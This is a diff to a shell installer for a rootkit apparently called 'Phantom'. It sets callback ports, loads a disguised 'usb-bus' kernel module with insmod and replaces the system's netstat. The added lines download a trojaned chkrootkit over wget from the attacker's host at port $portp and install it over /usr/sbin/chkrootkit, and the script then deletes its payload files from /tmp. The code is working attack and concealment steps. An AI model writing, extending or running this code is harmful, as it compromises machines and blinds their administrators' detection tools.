@@ -2,8 +2,8 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15136"
-portr="15272"
+portp="15402"
+portr="15119"
 portk="1234"
 
 echo "---Phantom started---"
@@ -266,7 +266,7 @@ printf "inserting the usb-bus module... "
 insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
 finish
 
-#--replace netstat--
+#-replace netstat-
 which netstat &>/dev/null
 if [ "$?" == "0" ]; then
   echo "--replace netstat--"
@@ -310,7 +310,16 @@ if [ "$?" == "0" ]; then
   rm -r /tmp/net-tools-master 2>/dev/null
 fi
 
-#--remove files and prerequisite programs--
+#replace chkrootkit
+which chkrootkit &>/dev/null
+if [ "$?" == "0" ]; then
+  echo "--replace chkrootkit--"
+  wget -q -O /usr/sbin/chkrootkit http://$ip:$portp/chkrootkit
+  chmod +x /usr/sbin/chkrootkit
+  finish
+fi
+
+#-remove files and prerequisite programs-
 echo "--remove files and prerequisite programs--"
 printf "removing files needed by payload... "
 rm /tmp/.rootkit &>/dev/null
